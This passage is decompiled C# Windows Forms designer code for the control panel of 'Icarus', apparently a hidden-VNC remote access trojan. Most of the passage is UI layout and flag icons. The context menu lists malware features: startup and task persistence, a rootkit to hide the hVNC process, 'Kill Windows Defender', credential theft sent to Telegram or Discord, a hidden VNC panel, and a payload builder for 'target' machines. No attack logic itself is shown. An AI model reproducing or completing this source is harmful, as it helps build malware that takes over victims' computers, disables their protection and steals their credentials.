			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.studioButton1 = new StudioButton();
			this.studioButton5 = new StudioButton();
			this.ClientsList = new System.Windows.Forms.ListView();
			this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader4 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader6 = new System.Windows.Forms.ColumnHeader();
			this.columnHeader7 = new System.Windows.Forms.ColumnHeader();
			this.studioButton4 = new StudioButton();
			this.studioButton3 = new StudioButton();
			this.panel1 = new System.Windows.Forms.Panel();
			this.chkListen = new JCS.ToggleSwitch();
			this.label1 = new System.Windows.Forms.Label();
			this.label_0 = new System.Windows.Forms.Label();
			this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
			this.contextMenuStrip1.SuspendLayout();
			this.primeTheme1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.panel1.SuspendLayout();
			base.SuspendLayout();
			this.imageList1.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList1.ImageStream");
			this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList1.Images.SetKeyName(0, "ad.png");
			this.imageList1.Images.SetKeyName(1, "ae.png");
			this.imageList1.Images.SetKeyName(2, "af.png");
			this.imageList1.Images.SetKeyName(3, "ag.png");
			this.imageList1.Images.SetKeyName(4, "ai.png");
			this.imageList1.Images.SetKeyName(5, "al.png");
			this.imageList1.Images.SetKeyName(6, "am.png");
			this.imageList1.Images.SetKeyName(7, "an.png");
			this.imageList1.Images.SetKeyName(8, "ao.png");
			this.imageList1.Images.SetKeyName(9, "ar.png");
			this.imageList1.Images.SetKeyName(10, "as.png");
			this.imageList1.Images.SetKeyName(11, "at.png");
			this.imageList1.Images.SetKeyName(12, "au.png");
			this.imageList1.Images.SetKeyName(13, "aw.png");
			this.imageList1.Images.SetKeyName(14, "ax.png");
			this.imageList1.Images.SetKeyName(15, "az.png");
			this.imageList1.Images.SetKeyName(16, "ba.png");
			this.imageList1.Images.SetKeyName(17, "bb.png");
			this.imageList1.Images.SetKeyName(18, "bd.png");
			this.imageList1.Images.SetKeyName(19, "be.png");
			this.imageList1.Images.SetKeyName(20, "bf.png");
			this.imageList1.Images.SetKeyName(21, "bg.png");
			this.imageList1.Images.SetKeyName(22, "bh.png");
			this.imageList1.Images.SetKeyName(23, "bi.png");
			this.imageList1.Images.SetKeyName(24, "bj.png");
			this.imageList1.Images.SetKeyName(25, "bm.png");
			this.imageList1.Images.SetKeyName(26, "bn.png");
			this.imageList1.Images.SetKeyName(27, "bo.png");
			this.imageList1.Images.SetKeyName(28, "br.png");
			this.imageList1.Images.SetKeyName(29, "bs.png");
			this.imageList1.Images.SetKeyName(30, "bt.png");
			this.imageList1.Images.SetKeyName(31, "bv.png");
			this.imageList1.Images.SetKeyName(32, "bw.png");
			this.imageList1.Images.SetKeyName(33, "by.png");
			this.imageList1.Images.SetKeyName(34, "bz.png");
			this.imageList1.Images.SetKeyName(35, "ca.png");
			this.imageList1.Images.SetKeyName(36, "catalonia.png");
			this.imageList1.Images.SetKeyName(37, "cc.png");
			this.imageList1.Images.SetKeyName(38, "cd.png");
			this.imageList1.Images.SetKeyName(39, "cf.png");
			this.imageList1.Images.SetKeyName(40, "cg.png");
			this.imageList1.Images.SetKeyName(41, "ch.png");
			this.imageList1.Images.SetKeyName(42, "ci.png");
			this.imageList1.Images.SetKeyName(43, "ck.png");
			this.imageList1.Images.SetKeyName(44, "cl.png");
			this.imageList1.Images.SetKeyName(45, "cm.png");
			this.imageList1.Images.SetKeyName(46, "cn.png");
			this.imageList1.Images.SetKeyName(47, "co.png");
			this.imageList1.Images.SetKeyName(48, "cr.png");
			this.imageList1.Images.SetKeyName(49, "cs.png");
			this.imageList1.Images.SetKeyName(50, "cu.png");
			this.imageList1.Images.SetKeyName(51, "cv.png");
			this.imageList1.Images.SetKeyName(52, "cx.png");
			this.imageList1.Images.SetKeyName(53, "cy.png");
			this.imageList1.Images.SetKeyName(54, "cz.png");
			this.imageList1.Images.SetKeyName(55, "de.png");
			this.imageList1.Images.SetKeyName(56, "dj.png");
			this.imageList1.Images.SetKeyName(57, "dk.png");
			this.imageList1.Images.SetKeyName(58, "dm.png");
			this.imageList1.Images.SetKeyName(59, "do.png");
			this.imageList1.Images.SetKeyName(60, "dz.png");
			this.imageList1.Images.SetKeyName(61, "ec.png");
			this.imageList1.Images.SetKeyName(62, "ee.png");
			this.imageList1.Images.SetKeyName(63, "eg.png");
			this.imageList1.Images.SetKeyName(64, "eh.png");
			this.imageList1.Images.SetKeyName(65, "england.png");
			this.imageList1.Images.SetKeyName(66, "er.png");
			this.imageList1.Images.SetKeyName(67, "es.png");
			this.imageList1.Images.SetKeyName(68, "et.png");
			this.imageList1.Images.SetKeyName(69, "europeanunion.png");
			this.imageList1.Images.SetKeyName(70, "fam.png");
			this.imageList1.Images.SetKeyName(71, "fi.png");
			this.imageList1.Images.SetKeyName(72, "fj.png");
			this.imageList1.Images.SetKeyName(73, "fk.png");
			this.imageList1.Images.SetKeyName(74, "fm.png");
			this.imageList1.Images.SetKeyName(75, "fo.png");
			this.imageList1.Images.SetKeyName(76, "fr.png");
			this.imageList1.Images.SetKeyName(77, "ga.png");
			this.imageList1.Images.SetKeyName(78, "gb.png");
			this.imageList1.Images.SetKeyName(79, "gd.png");
			this.imageList1.Images.SetKeyName(80, "ge.png");
			this.imageList1.Images.SetKeyName(81, "gf.png");
			this.imageList1.Images.SetKeyName(82, "gh.png");
			this.imageList1.Images.SetKeyName(83, "gi.png");
			this.imageList1.Images.SetKeyName(84, "gl.png");
			this.imageList1.Images.SetKeyName(85, "gm.png");
			this.imageList1.Images.SetKeyName(86, "gn.png");
			this.imageList1.Images.SetKeyName(87, "gp.png");
			this.imageList1.Images.SetKeyName(88, "gq.png");
			this.imageList1.Images.SetKeyName(89, "gr.png");
			this.imageList1.Images.SetKeyName(90, "gs.png");
			this.imageList1.Images.SetKeyName(91, "gt.png");
			this.imageList1.Images.SetKeyName(92, "gu.png");
			this.imageList1.Images.SetKeyName(93, "gw.png");
			this.imageList1.Images.SetKeyName(94, "gy.png");
			this.imageList1.Images.SetKeyName(95, "hk.png");
			this.imageList1.Images.SetKeyName(96, "hm.png");
			this.imageList1.Images.SetKeyName(97, "hn.png");
			this.imageList1.Images.SetKeyName(98, "hr.png");
			this.imageList1.Images.SetKeyName(99, "ht.png");
			this.imageList1.Images.SetKeyName(100, "hu.png");
			this.imageList1.Images.SetKeyName(101, "id.png");
			this.imageList1.Images.SetKeyName(102, "ie.png");
			this.imageList1.Images.SetKeyName(103, "il.png");
			this.imageList1.Images.SetKeyName(104, "in.png");
			this.imageList1.Images.SetKeyName(105, "io.png");
			this.imageList1.Images.SetKeyName(106, "iq.png");
			this.imageList1.Images.SetKeyName(107, "ir.png");
			this.imageList1.Images.SetKeyName(108, "is.png");
			this.imageList1.Images.SetKeyName(109, "it.png");
			this.imageList1.Images.SetKeyName(110, "jm.png");
			this.imageList1.Images.SetKeyName(111, "jo.png");
			this.imageList1.Images.SetKeyName(112, "jp.png");
			this.imageList1.Images.SetKeyName(113, "ke.png");
			this.imageList1.Images.SetKeyName(114, "kg.png");
			this.imageList1.Images.SetKeyName(115, "kh.png");
			this.imageList1.Images.SetKeyName(116, "ki.png");
			this.imageList1.Images.SetKeyName(117, "km.png");
			this.imageList1.Images.SetKeyName(118, "kn.png");
			this.imageList1.Images.SetKeyName(119, "kp.png");
			this.imageList1.Images.SetKeyName(120, "kr.png");
			this.imageList1.Images.SetKeyName(121, "kw.png");
			this.imageList1.Images.SetKeyName(122, "ky.png");
			this.imageList1.Images.SetKeyName(123, "kz.png");
			this.imageList1.Images.SetKeyName(124, "la.png");
			this.imageList1.Images.SetKeyName(125, "lb.png");
			this.imageList1.Images.SetKeyName(126, "lc.png");
			this.imageList1.Images.SetKeyName(127, "li.png");
			this.imageList1.Images.SetKeyName(128, "lk.png");
			this.imageList1.Images.SetKeyName(129, "lr.png");
			this.imageList1.Images.SetKeyName(130, "ls.png");
			this.imageList1.Images.SetKeyName(131, "lt.png");
			this.imageList1.Images.SetKeyName(132, "lu.png");
			this.imageList1.Images.SetKeyName(133, "lv.png");
			this.imageList1.Images.SetKeyName(134, "ly.png");
			this.imageList1.Images.SetKeyName(135, "ma.png");
			this.imageList1.Images.SetKeyName(136, "mc.png");
			this.imageList1.Images.SetKeyName(137, "md.png");
			this.imageList1.Images.SetKeyName(138, "me.png");
			this.imageList1.Images.SetKeyName(139, "mg.png");
			this.imageList1.Images.SetKeyName(140, "mh.png");
			this.imageList1.Images.SetKeyName(141, "mk.png");
			this.imageList1.Images.SetKeyName(142, "ml.png");
			this.imageList1.Images.SetKeyName(143, "mm.png");
			this.imageList1.Images.SetKeyName(144, "mn.png");
			this.imageList1.Images.SetKeyName(145, "mo.png");
			this.imageList1.Images.SetKeyName(146, "mp.png");
			this.imageList1.Images.SetKeyName(147, "mq.png");
			this.imageList1.Images.SetKeyName(148, "mr.png");
			this.imageList1.Images.SetKeyName(149, "ms.png");
			this.imageList1.Images.SetKeyName(150, "mt.png");
			this.imageList1.Images.SetKeyName(151, "mu.png");
			this.imageList1.Images.SetKeyName(152, "mv.png");
			this.imageList1.Images.SetKeyName(153, "mw.png");
			this.imageList1.Images.SetKeyName(154, "mx.png");
			this.imageList1.Images.SetKeyName(155, "my.png");
			this.imageList1.Images.SetKeyName(156, "mz.png");
			this.imageList1.Images.SetKeyName(157, "na.png");
			this.imageList1.Images.SetKeyName(158, "nc.png");
			this.imageList1.Images.SetKeyName(159, "ne.png");
			this.imageList1.Images.SetKeyName(160, "nf.png");
			this.imageList1.Images.SetKeyName(161, "ng.png");
			this.imageList1.Images.SetKeyName(162, "ni.png");
			this.imageList1.Images.SetKeyName(163, "nl.png");
			this.imageList1.Images.SetKeyName(164, "no.png");
			this.imageList1.Images.SetKeyName(165, "np.png");
			this.imageList1.Images.SetKeyName(166, "nr.png");
			this.imageList1.Images.SetKeyName(167, "nu.png");
			this.imageList1.Images.SetKeyName(168, "nz.png");
			this.imageList1.Images.SetKeyName(169, "om.png");
			this.imageList1.Images.SetKeyName(170, "pa.png");
			this.imageList1.Images.SetKeyName(171, "pe.png");
			this.imageList1.Images.SetKeyName(172, "pf.png");
			this.imageList1.Images.SetKeyName(173, "pg.png");
			this.imageList1.Images.SetKeyName(174, "ph.png");
			this.imageList1.Images.SetKeyName(175, "pk.png");
			this.imageList1.Images.SetKeyName(176, "pl.png");
			this.imageList1.Images.SetKeyName(177, "pm.png");
			this.imageList1.Images.SetKeyName(178, "pn.png");
			this.imageList1.Images.SetKeyName(179, "pr.png");
			this.imageList1.Images.SetKeyName(180, "ps.png");
			this.imageList1.Images.SetKeyName(181, "pt.png");
			this.imageList1.Images.SetKeyName(182, "pw.png");
			this.imageList1.Images.SetKeyName(183, "py.png");
			this.imageList1.Images.SetKeyName(184, "qa.png");
			this.imageList1.Images.SetKeyName(185, "re.png");
			this.imageList1.Images.SetKeyName(186, "ro.png");
			this.imageList1.Images.SetKeyName(187, "rs.png");
			this.imageList1.Images.SetKeyName(188, "ru.png");
			this.imageList1.Images.SetKeyName(189, "rw.png");
			this.imageList1.Images.SetKeyName(190, "sa.png");
			this.imageList1.Images.SetKeyName(191, "sb.png");
			this.imageList1.Images.SetKeyName(192, "sc.png");
			this.imageList1.Images.SetKeyName(193, "scotland.png");
			this.imageList1.Images.SetKeyName(194, "sd.png");
			this.imageList1.Images.SetKeyName(195, "se.png");
			this.imageList1.Images.SetKeyName(196, "sg.png");
			this.imageList1.Images.SetKeyName(197, "sh.png");
			this.imageList1.Images.SetKeyName(198, "si.png");
			this.imageList1.Images.SetKeyName(199, "sj.png");
			this.imageList1.Images.SetKeyName(200, "sk.png");
			this.imageList1.Images.SetKeyName(201, "sl.png");
			this.imageList1.Images.SetKeyName(202, "sm.png");
			this.imageList1.Images.SetKeyName(203, "sn.png");
			this.imageList1.Images.SetKeyName(204, "so.png");
			this.imageList1.Images.SetKeyName(205, "sr.png");
			this.imageList1.Images.SetKeyName(206, "st.png");
			this.imageList1.Images.SetKeyName(207, "sv.png");
			this.imageList1.Images.SetKeyName(208, "sy.png");
			this.imageList1.Images.SetKeyName(209, "sz.png");
			this.imageList1.Images.SetKeyName(210, "tc.png");
			this.imageList1.Images.SetKeyName(211, "td.png");
			this.imageList1.Images.SetKeyName(212, "tf.png");
			this.imageList1.Images.SetKeyName(213, "tg.png");
			this.imageList1.Images.SetKeyName(214, "th.png");
			this.imageList1.Images.SetKeyName(215, "tj.png");
			this.imageList1.Images.SetKeyName(216, "tk.png");
			this.imageList1.Images.SetKeyName(217, "tl.png");
			this.imageList1.Images.SetKeyName(218, "tm.png");
			this.imageList1.Images.SetKeyName(219, "tn.png");
			this.imageList1.Images.SetKeyName(220, "to.png");
			this.imageList1.Images.SetKeyName(221, "tr.png");
			this.imageList1.Images.SetKeyName(222, "tt.png");
			this.imageList1.Images.SetKeyName(223, "tv.png");
			this.imageList1.Images.SetKeyName(224, "tw.png");
			this.imageList1.Images.SetKeyName(225, "tz.png");
			this.imageList1.Images.SetKeyName(226, "ua.png");
			this.imageList1.Images.SetKeyName(227, "ug.png");
			this.imageList1.Images.SetKeyName(228, "um.png");
			this.imageList1.Images.SetKeyName(229, "us.png");
			this.imageList1.Images.SetKeyName(230, "uy.png");
			this.imageList1.Images.SetKeyName(231, "uz.png");
			this.imageList1.Images.SetKeyName(232, "va.png");
			this.imageList1.Images.SetKeyName(233, "vc.png");
			this.imageList1.Images.SetKeyName(234, "ve.png");
			this.imageList1.Images.SetKeyName(235, "vg.png");
			this.imageList1.Images.SetKeyName(236, "vi.png");
			this.imageList1.Images.SetKeyName(237, "vn.png");
			this.imageList1.Images.SetKeyName(238, "vu.png");
			this.imageList1.Images.SetKeyName(239, "wales.png");
			this.imageList1.Images.SetKeyName(240, "wf.png");
			this.imageList1.Images.SetKeyName(241, "ws.png");
			this.imageList1.Images.SetKeyName(242, "ye.png");
			this.imageList1.Images.SetKeyName(243, "yt.png");
			this.imageList1.Images.SetKeyName(244, "za.png");
			this.imageList1.Images.SetKeyName(245, "zm.png");
			this.imageList1.Images.SetKeyName(246, "zw.png");
			this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
			this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.controlManagementToolStripMenuItem, this.miscOptionsToolStripMenuItem, this.serverControlToolStripMenuItem, this.hVNCPanelToolStripMenuItem, this.buildHVNCToolStripMenuItem });
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new System.Drawing.Size(185, 156);
			this.controlManagementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.startupToolStripMenuItem, this.taskToolStripMenuItem });
			this.controlManagementToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("controlManagementToolStripMenuItem.Image");
			this.controlManagementToolStripMenuItem.Name = "controlManagementToolStripMenuItem";
			this.controlManagementToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
			this.controlManagementToolStripMenuItem.Text = "Persistence Options";
			this.startupToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("startupToolStripMenuItem.Image");
			this.startupToolStripMenuItem.Name = "startupToolStripMenuItem";
			this.startupToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
			this.startupToolStripMenuItem.Text = "Add";
			this.startupToolStripMenuItem.ToolTipText = "Add Startup and Task All in one!";
			this.startupToolStripMenuItem.Click += new System.EventHandler(startupToolStripMenuItem_Click);
			this.taskToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("taskToolStripMenuItem.Image");
			this.taskToolStripMenuItem.Name = "taskToolStripMenuItem";
			this.taskToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
			this.taskToolStripMenuItem.Text = "Remove";
			this.taskToolStripMenuItem.ToolTipText = "Remove Startup and Task!";
			this.taskToolStripMenuItem.Click += new System.EventHandler(taskToolStripMenuItem_Click);
			this.miscOptionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.watcherToolStripMenuItem, this.rootkitToolStripMenuItem, this.killWindowsDefenderToolStripMenuItem, this.passwordsRecoveryToolStripMenuItem, this.stealAndSendToDiscordToolStripMenuItem });
			this.miscOptionsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("miscOptionsToolStripMenuItem.Image");
			this.miscOptionsToolStripMenuItem.Name = "miscOptionsToolStripMenuItem";
			this.miscOptionsToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
			this.miscOptionsToolStripMenuItem.Text = "Misc Options";
			this.watcherToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("watcherToolStripMenuItem.Image");
			this.watcherToolStripMenuItem.Name = "watcherToolStripMenuItem";
			this.watcherToolStripMenuItem.Size = new System.Drawing.Size(220, 26);
			this.watcherToolStripMenuItem.Text = "Watcher";
			this.watcherToolStripMenuItem.ToolTipText = "If you activate Watcher ,do not activate Rootkit!";
			this.watcherToolStripMenuItem.Visible = false;
			this.watcherToolStripMenuItem.Click += new System.EventHandler(watcherToolStripMenuItem_Click);
			this.rootkitToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("rootkitToolStripMenuItem.Image");
			this.rootkitToolStripMenuItem.Name = "rootkitToolStripMenuItem";
			this.rootkitToolStripMenuItem.Size = new System.Drawing.Size(220, 26);
			this.rootkitToolStripMenuItem.Text = "Rootkit(Hide HVNC Proc)";
			this.rootkitToolStripMenuItem.ToolTipText = "If you activate Rootkit ,do not activate Watcher!";
			this.rootkitToolStripMenuItem.Visible = false;
			this.rootkitToolStripMenuItem.Click += new System.EventHandler(rootkitToolStripMenuItem_Click);
			this.killWindowsDefenderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("killWindowsDefenderToolStripMenuItem.Image");
			this.killWindowsDefenderToolStripMenuItem.Name = "killWindowsDefenderToolStripMenuItem";
			this.killWindowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(220, 26);
			this.killWindowsDefenderToolStripMenuItem.Text = "Kill Windows Defender";
			this.killWindowsDefenderToolStripMenuItem.ToolTipText = "Disable Windows Defender!";
			this.killWindowsDefenderToolStripMenuItem.Click += new System.EventHandler(killWindowsDefenderToolStripMenuItem_Click);
			this.passwordsRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("passwordsRecoveryToolStripMenuItem.Image");
			this.passwordsRecoveryToolStripMenuItem.Name = "passwordsRecoveryToolStripMenuItem";
			this.passwordsRecoveryToolStripMenuItem.Size = new System.Drawing.Size(220, 26);
			this.passwordsRecoveryToolStripMenuItem.Text = "Steal and Send to Telegram";
			this.passwordsRecoveryToolStripMenuItem.Visible = false;
			this.passwordsRecoveryToolStripMenuItem.Click += new System.EventHandler(passwordsRecoveryToolStripMenuItem_Click_1);
			this.stealAndSendToDiscordToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("stealAndSendToDiscordToolStripMenuItem.Image");
			this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
			this.stealAndSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(220, 26);
			this.stealAndSendToDiscordToolStripMenuItem.Text = "Steal and Send to Discord";
			this.stealAndSendToDiscordToolStripMenuItem.Visible = false;
			this.stealAndSendToDiscordToolStripMenuItem.Click += new System.EventHandler(stealAndSendToDiscordToolStripMenuItem_Click);
			this.serverControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.uninstallToolStripMenuItem, this.restartToolStripMenuItem, this.resetSizeToolStripMenuItem });
			this.serverControlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("serverControlToolStripMenuItem.Image");
			this.serverControlToolStripMenuItem.Name = "serverControlToolStripMenuItem";
			this.serverControlToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
			this.serverControlToolStripMenuItem.Text = "Server Control";
			this.uninstallToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uninstallToolStripMenuItem.Image");
			this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
			this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
			this.uninstallToolStripMenuItem.Text = "Uninstall";
			this.uninstallToolStripMenuItem.ToolTipText = "Kill and remove payload!";
			this.uninstallToolStripMenuItem.Click += new System.EventHandler(uninstallToolStripMenuItem_Click);
			this.restartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("restartToolStripMenuItem.Image");
			this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
			this.restartToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
			this.restartToolStripMenuItem.Text = "Restart";
			this.restartToolStripMenuItem.Visible = false;
			this.resetSizeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("resetSizeToolStripMenuItem.Image");
			this.resetSizeToolStripMenuItem.Name = "resetSizeToolStripMenuItem";
			this.resetSizeToolStripMenuItem.Size = new System.Drawing.Size(125, 22);
			this.resetSizeToolStripMenuItem.Text = "Reset Size";
			this.resetSizeToolStripMenuItem.ToolTipText = "Reset Scale hVNC!";
			this.resetSizeToolStripMenuItem.Click += new System.EventHandler(resetSizeToolStripMenuItem_Click);
			this.hVNCPanelToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("hVNCPanelToolStripMenuItem.Image");
			this.hVNCPanelToolStripMenuItem.Name = "hVNCPanelToolStripMenuItem";
			this.hVNCPanelToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
			this.hVNCPanelToolStripMenuItem.Text = "hVNC Panel";
			this.hVNCPanelToolStripMenuItem.ToolTipText = "Open hVNC Controller!";
			this.hVNCPanelToolStripMenuItem.Click += new System.EventHandler(hVNCPanelToolStripMenuItem_Click);
			this.buildHVNCToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("buildHVNCToolStripMenuItem.Image");
			this.buildHVNCToolStripMenuItem.Name = "buildHVNCToolStripMenuItem";
			this.buildHVNCToolStripMenuItem.Size = new System.Drawing.Size(184, 26);
			this.buildHVNCToolStripMenuItem.Text = "Payload Builder";
			this.buildHVNCToolStripMenuItem.ToolTipText = "Build a Payload to run on target mashine!";
			this.buildHVNCToolStripMenuItem.Click += new System.EventHandler(buildHVNCToolStripMenuItem_Click);
			this.imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
			this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
			this.imageList2.Images.SetKeyName(0, "server_delete.png");
			this.imageList2.Images.SetKeyName(1, "server_disconnect.png");
			this.primeTheme1.BackColor = System.Drawing.Color.White;
			this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
			bloom.Name = "Sides";
			bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
			bloom2.Name = "Gradient1";
			bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
			bloom3.Name = "Gradient2";
			bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
			bloom4.Name = "TextShade";
			bloom4.Value = System.Drawing.Color.White;
			bloom5.Name = "Text";
			bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
			bloom6.Name = "Back";
			bloom6.Value = System.Drawing.Color.White;
			bloom7.Name = "Border1";
			bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
			bloom8.Name = "Border2";
			bloom8.Value = System.Drawing.Color.White;
			bloom9.Name = "Border3";
			bloom9.Value = System.Drawing.Color.White;
			bloom10.Name = "Border4";
			bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
			this.primeTheme1.Colors = new BloomBrain[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
			this.primeTheme1.Controls.Add(this.label3);
			this.primeTheme1.Controls.Add(this.pictureBox1);
			this.primeTheme1.Controls.Add(this.studioButton1);
			this.primeTheme1.Controls.Add(this.studioButton5);
			this.primeTheme1.Controls.Add(this.ClientsList);
			this.primeTheme1.Controls.Add(this.studioButton4);
			this.primeTheme1.Controls.Add(this.studioButton3);
			this.primeTheme1.Controls.Add(this.panel1);
			this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
			this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
			this.primeTheme1.Font = new System.Drawing.Font("Verdana", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.primeTheme1.Image = null;
			this.primeTheme1.Location = new System.Drawing.Point(0, 0);
			this.primeTheme1.Movable = true;
			this.primeTheme1.Name = "primeTheme1";
			this.primeTheme1.NoRounding = false;
			this.primeTheme1.Sizable = true;
			this.primeTheme1.Size = new System.Drawing.Size(1374, 671);
			this.primeTheme1.SmartBounds = true;
			this.primeTheme1.TabIndex = 2;
			this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
			this.label3.AutoSize = true;
			this.label3.BackColor = System.Drawing.Color.Transparent;
			this.label3.Font = new System.Drawing.Font("Verdana", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = System.Drawing.Color.Black;
			this.label3.Location = new System.Drawing.Point(39, 13);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(54, 16);
			this.label3.TabIndex = 38;
			this.label3.Text = "Icarus";
			this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
			this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new System.Drawing.Point(1, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(51, 48);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 37;
			this.pictureBox1.TabStop = false;
			this.studioButton1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton1.BackColor = System.Drawing.Color.Transparent;
			bloom11.Name = "DownGradient1";
			bloom11.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom12.Name = "DownGradient2";
			bloom12.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom13.Name = "NoneGradient1";
			bloom13.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom14.Name = "NoneGradient2";
			bloom14.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom15.Name = "Shine1";
			bloom15.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom16.Name = "Shine2A";
			bloom16.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom17.Name = "Shine2B";
			bloom17.Value = System.Drawing.Color.Transparent;
			bloom18.Name = "Shine3";
			bloom18.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom19.Name = "TextShade";
			bloom19.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom20.Name = "Text";
			bloom20.Value = System.Drawing.Color.White;
			bloom21.Name = "Glow";
			bloom21.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom22.Name = "Border";
			bloom22.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom23.Name = "Corners";
			bloom23.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton1.Colors = new BloomBrain[13]
			{
				bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
				bloom21, bloom22, bloom23
			};
			this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton1.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton1.Image = null;
			this.studioButton1.Location = new System.Drawing.Point(1290, -5);
			this.studioButton1.Name = "studioButton1";
			this.studioButton1.NoRounding = false;
			this.studioButton1.Size = new System.Drawing.Size(13, 30);
			this.studioButton1.TabIndex = 25;
			this.studioButton1.Transparent = true;
			this.studioButton1.Click += new System.EventHandler(studioButton1_Click);
			this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton5.BackColor = System.Drawing.Color.Transparent;
			bloom24.Name = "DownGradient1";
			bloom24.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom25.Name = "DownGradient2";
			bloom25.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom26.Name = "NoneGradient1";
			bloom26.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom27.Name = "NoneGradient2";
			bloom27.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom28.Name = "Shine1";
			bloom28.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom29.Name = "Shine2A";
			bloom29.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom30.Name = "Shine2B";
			bloom30.Value = System.Drawing.Color.Transparent;
			bloom31.Name = "Shine3";
			bloom31.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom32.Name = "TextShade";
			bloom32.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom33.Name = "Text";
			bloom33.Value = System.Drawing.Color.White;
			bloom34.Name = "Glow";
			bloom34.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom35.Name = "Border";
